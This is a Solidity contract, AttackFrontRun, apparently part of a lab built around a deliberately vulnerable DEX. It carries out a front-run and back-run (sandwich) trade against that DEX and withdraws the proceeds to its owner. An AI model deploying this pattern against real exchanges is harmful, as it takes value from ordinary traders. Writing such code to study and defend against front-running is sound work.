// SPDX-License-Identifier: MIT
pragma solidity 0.8.34;

import "./VulnerableDEX_clean.sol";

contract AttackFrontRun {
    VulnerableDEX public immutable dex;
    address public immutable owner;

    constructor(address _dex) payable {
        dex = VulnerableDEX(_dex);
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner, "Not owner");
        _;
    }

    function frontrun(uint256 ethAmount) external onlyOwner {
        require(address(this).balance >= ethAmount, "Insufficient ETH");
        dex.swapETHForTokens{ value: ethAmount }();
    }

    function backrun() external onlyOwner {
        uint256 tokens = dex.tokenBalances(address(this));
        require(tokens > 0, "No tokens to sell");
        dex.swapTokensForETH(tokens);
    }

    function withdraw() external onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {}
}